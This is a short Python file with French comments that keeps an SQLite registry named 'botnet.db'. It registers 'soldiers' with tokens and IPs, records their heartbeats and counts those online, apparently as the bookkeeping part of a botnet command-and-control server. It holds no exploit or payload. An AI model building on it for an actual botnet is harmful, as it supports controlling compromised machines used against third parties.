import sqlite3
import time
import uuid

DB_NAME = "botnet.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    # Table des soldats : Token (ID unique), IP, Dernière connexion
    c.execute('''CREATE TABLE IF NOT EXISTS soldiers 
                 (token TEXT PRIMARY KEY, ip TEXT, last_seen REAL)''')
    conn.commit()
    conn.close()

def register_soldier(ip):
    """Enregistre un nouveau soldat et renvoie son Token"""
    token = str(uuid.uuid4()) # Génère un ID unique complexe
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO soldiers (token, ip, last_seen) VALUES (?, ?, ?)", (token, ip, time.time()))
    conn.commit()
    conn.close()
    return token

def update_heartbeat(token, ip):
    """Met à jour le timestamp du soldat s'il existe"""
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    # On vérifie si le token existe
    c.execute("SELECT token FROM soldiers WHERE token=?", (token,))
    if c.fetchone() is None:
        conn.close()
        return False # Token invalide (Rejeté)
    
    # Mise à jour
    c.execute("UPDATE soldiers SET last_seen=?, ip=? WHERE token=?", (time.time(), ip, token))
    conn.commit()
    conn.close()
    return True # Accepté

def count_online_soldiers(timeout=70):
    """Compte combien de soldats ont parlé dans les X dernières secondes"""
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    limit = time.time() - timeout
    c.execute("SELECT COUNT(*) FROM soldiers WHERE last_seen > ?", (limit,))
    count = c.fetchone()[0]
    conn.close()
    return count